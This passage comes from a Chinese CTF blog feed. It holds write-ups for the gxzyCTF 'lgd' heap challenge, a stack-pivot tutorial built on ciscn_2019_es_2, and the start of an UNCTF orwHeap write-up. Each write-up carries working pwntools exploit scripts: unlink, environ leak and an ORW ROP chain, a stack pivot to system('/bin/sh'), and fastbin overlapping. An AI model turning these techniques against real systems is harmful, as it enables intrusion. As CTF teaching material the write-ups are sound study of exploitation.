      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> gxzy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>gxzyCTF pwn lgd</title>
      <link href="/2020/04/09/gxzyCTF-pwn-lgd/"/>
      <url>/2020/04/09/gxzyCTF-pwn-lgd/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经典的glibc2.23环境下的堆溢出，程序自带混淆，可以通过简单的黑盒测试确定程序的逻辑。禁掉了execev，可以在栈上构造orw，也可以通过栈迁移打orw。这里利用unlink进行任意地址读写，然后利用environ泄露栈地址，然后在栈上构造orw的ROP链。</p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>通过静态分析可以发现，程序存在add、free、show、edit四个功能。</p><p>add：可以malloc大小为[0,0x1000]的堆块，conten并没有直接写进heap，而是放在大小为0x200的bss段中</p><p>free：正常free，有清零</p><p>show：正常</p><p>edit：可以发现edit的大小存放在bss段中</p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>可以发现，edit的大小与堆的大小没有关系，而是等于content的长度，因此可以堆溢出</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>有show，可以malloc smallbin，便可以泄露libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">"name?"</span>,<span class="string">"kangel"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>有smallbin和堆溢出，可以构造unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x200</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'3'</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>*<span class="number">0x200</span>)<span class="comment">#4</span></span><br><span class="line">to_fake=<span class="number">0x6032e0</span>+<span class="number">0x10</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(to_fake<span class="number">-0x18</span>)+p64(to_fake<span class="number">-0x10</span>)+<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>))</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3 unlink</span></span><br></pre></td></tr></table></figure><p>堆布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x6032e0                                             </span><br><span class="line">0x6032e0:       0x0000000000db8010      0x0000000000db80a0</span><br><span class="line">0x6032f0:       0x0000000000db80c0      0x0000000000db81d0</span><br><span class="line">0x603300:       0x0000000000db82e0      0x0000000000000000</span><br><span class="line">0x603310:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603320:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/40gx 0x0000000000db80c0</span><br><span class="line">0xdb80c0:       0x0000000000000000      0x0000000000000101</span><br><span class="line">0xdb80d0:       0x00000000006032d8      0x00000000006032e0</span><br><span class="line">0xdb80e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb80f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8100:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8110:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8120:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8130:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8140:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8150:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8160:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8170:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8180:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8190:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81a0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81c0:       0x0000000000000100      0x0000000000000110</span><br><span class="line">0xdb81d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81f0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>条件：bck-&gt;FD + 0x18 = bck ; bck-&gt;BK + 0x10 = bck</p><p>效果：bck = *bck - 0x18</p><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>可以利用environ进行泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">environ=libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line">rbp_addr=stack<span class="number">-0x228</span></span><br></pre></td></tr></table></figure><p>计算environ与edit函数中rbp的差值，因为利用edit往栈中写入数据后直接进行rop</p><p><img alt="" data-src="/2020/04/09/gxzyCTF-pwn-lgd/1.png" class="lazyload"></p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>直接往rbp中注入rop链即可</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">1</span>))</span><br><span class="line">    sl(<span class="string">"______?\n"</span>,str(size))</span><br><span class="line">    s(<span class="string">"yes_or_no?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">3</span>))</span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">4</span>)),<span class="number">0</span></span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line">    s(<span class="string">"new_content ?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"name?"</span>,<span class="string">"kangel"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x200</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'3'</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>*<span class="number">0x200</span>)<span class="comment">#4</span></span><br><span class="line">to_fake=<span class="number">0x6032e0</span>+<span class="number">0x10</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(to_fake<span class="number">-0x18</span>)+p64(to_fake<span class="number">-0x10</span>)+<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>))</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3 unlink</span></span><br><span class="line">environ=libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line">rbp_addr=stack<span class="number">-0x228</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(rbp_addr))</span><br><span class="line">prdi = <span class="number">0x0000000000021102</span></span><br><span class="line">prsi = <span class="number">0x00000000000202e8</span></span><br><span class="line">prdx = <span class="number">0x0000000000001b92</span></span><br><span class="line">prdi = libc_base + prdi</span><br><span class="line">prsi = libc_base + prsi</span><br><span class="line">prdx = libc_base + prdx</span><br><span class="line">open = libc_base + libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">rop = <span class="string">'./flag\x00\x00'</span></span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(rbp_addr)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(open)</span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(<span class="number">0x3</span>)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(rbp_addr + <span class="number">0x500</span>)</span><br><span class="line">rop += p64(prdx)</span><br><span class="line">rop += p64(<span class="number">0x50</span>)</span><br><span class="line">rop += p64(read)</span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(rbp_addr + <span class="number">0x500</span>)</span><br><span class="line">rop += p64(prdx)</span><br><span class="line">rop += p64(<span class="number">0x50</span>)</span><br><span class="line">rop += p64(write)</span><br><span class="line"><span class="comment">#print rop</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">gd()</span><br><span class="line">edit(<span class="number">0</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> gxzy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>栈迁移的多种技巧</title>
      <link href="/2020/04/09/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%8A%80%E5%B7%A7/"/>
      <url>/2020/04/09/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当栈空间不够利用或者无法利用时，我们又需要利用rop的时候，栈迁移可以帮助我们。</p><p>下面介绍几种常见的栈迁移方法，持续更新！</p><h3 id="double-ret"><a href="#double-ret" class="headerlink" title="double ret"></a>double ret</h3><p>double ret就是通过将ebp覆盖成我们构造的fake_ebp ，然后利用<code>leave ; ret</code>这样的gadget将esp劫持到fake_ebp的地址上</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>假设可以覆盖ebp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">esp |          |</span><br><span class="line">    | ...      |</span><br><span class="line">ebp | fake_ebp |</span><br><span class="line">    | ...      |</span><br><span class="line">    |leave_ret |</span><br></pre></td></tr></table></figure><p>第一次<code>leave ; ret</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp; ebp</span><br><span class="line">pop ebp             #此时ebp的值为fake_ebp</span><br></pre></td></tr></table></figure><p>第二次<code>leave ; ret</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov esp; ebp        #esp的值为fake_ebp</span><br></pre></td></tr></table></figure><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>下面以ciscn_2019_es_2为例</p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/pwn/buuoj/es_2_stack_pivot/ciscn_2019_es_2&apos;         </span><br><span class="line">    Arch:     i386-32-little                                     </span><br><span class="line">    RELRO:    Partial RELRO                                  </span><br><span class="line">    Stack:    No canary found                            </span><br><span class="line">    NX:       NX enabled                                            </span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序漏洞很明显，32位程序下有8字节的栈溢出，可以覆盖到ebp和函数返回地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p>1、第一次read和printf可以泄露栈地址</p><p>2、第二次read可以进行栈迁移将栈压低，刚好可以利用vul函数的main函数的double ret</p><p>vul函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FD                 leave</span><br><span class="line">.text:080485FE                 retn</span><br></pre></td></tr></table></figure><p>main函数，需要注意的是main函数的返回稍有不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0804862F                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048632                 leave</span><br><span class="line">.text:08048633                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048636                 retn</span><br></pre></td></tr></table></figure><p>栈布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/12wx $ebp-0x28</span><br><span class="line">0xff975d10:     0x61616161      0xff975d20      0x62626262      0x08048400</span><br><span class="line">0xff975d20:     0x63636363      0xff975d28      0x6e69622f      0x0068732f</span><br><span class="line">0xff975d30:     0x70707070      0x70707070      0xff975d18      0x0804862a</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">sys_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">pl=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line">p.send(pl)</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp1=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">ebp2 = ebp1 - <span class="number">0x10</span></span><br><span class="line">pl2=(<span class="string">'a'</span>*<span class="number">4</span>+p32(ebp<span class="number">-0x18</span>)+<span class="string">'bbbb'</span>+p32(sys_plt)+<span class="string">'cccc'</span>+p32(ebp<span class="number">-0x10</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'d'</span>)+p32(ebp<span class="number">-0x20</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(pl2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pop-leave"><a href="#pop-leave" class="headerlink" title="pop leave"></a>pop leave</h3><p>可以直接利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rbp；</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>UNCTF 2019 pwn orwHeap详解</title>
      <link href="/2020/04/01/UNCTF-2019-pwn-orwHeap%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/04/01/UNCTF-2019-pwn-orwHeap%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是glibc2.23环境的堆题，包含多种知识与技巧。例如：沙箱函数、overlapping、利用_IO_2_1_stdout_泄漏libc、unsorted bin attack、fastbin attack、setcontext、mprotect、srop等等。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>检查保护机制，保护全开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  unctf_orwheap checksec pwn     </span><br><span class="line">[*] &apos;/mnt/hgfs/shared/unctf_orwheap/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida静态分析</p><p><img alt="" data-src="/2020/04/01/UNCTF-2019-pwn-orwHeap详解/1.png" class="lazyload"></p><p>可以发现在add函数处存在off by one。但是限制了size大小(size &gt; 0x67 &amp;&amp; size &lt;= 0x3F0)，这样我们依然可以进行overlapping。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'0'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)  <span class="comment">#绕过inuse(p)的检测</span></span><br><span class="line">add(<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#触发overlapping</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br></pre></td></tr></table></figure><p>此时bin的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x55e33cd130f0 —▸ 0x7f577e8c2b78 (main_arena+88) ◂— 0x55e33cd130f0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55e33cd130f0 —▸ 0x7f577e8c2b78 (main_arena+88) ◂— 0x55e33cd130f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>查看0x55e33cd130f0的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap 0x55e33cd130f0</span><br><span class="line">0x55e33cd130f0 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 113, </span><br><span class="line">  fd = 0x7f577e8c2b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7f577e8c2b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时如果有show的功能的话，就可以直接add(0x68,’2’*0x60)从而泄露&lt;main_arena+88&gt;的地址再计算得到libc基址。但这里没有libc基址，于是只好利用<code>_IO_2_1_stdout_</code>泄漏libc。具体操作如下：</p><p>1、修改fd的低字节为’\xdd\x25’，让它指向<code>_IO_2_1_stdout_</code>。这里的<code>2</code>需要爆破，概率为1/16</p><p>2、利用fastbin attack可以修改<code>_IO_2_1_stdout_</code>的flag字段从而泄露libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$5 = (struct _IO_FILE *) 0x7f41f9aa4620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; x/10gx 